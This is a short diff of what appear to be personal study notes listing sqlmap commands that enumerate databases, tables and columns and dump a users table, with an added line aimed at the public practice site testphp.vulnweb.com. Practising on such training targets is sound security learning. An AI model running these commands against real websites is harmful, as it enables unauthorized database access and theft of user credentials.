@@ -2,3 +2,4 @@ sqlmap -u "url/" -dbs
 sqlmap -u "url/" -D "db name" -table
 sqlmap -u "url/" -D "db name" -T users --columns
 sqlmap -u "url/" -D "db name" -T users --dump 
+sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns --dump (Y,Y enter N)
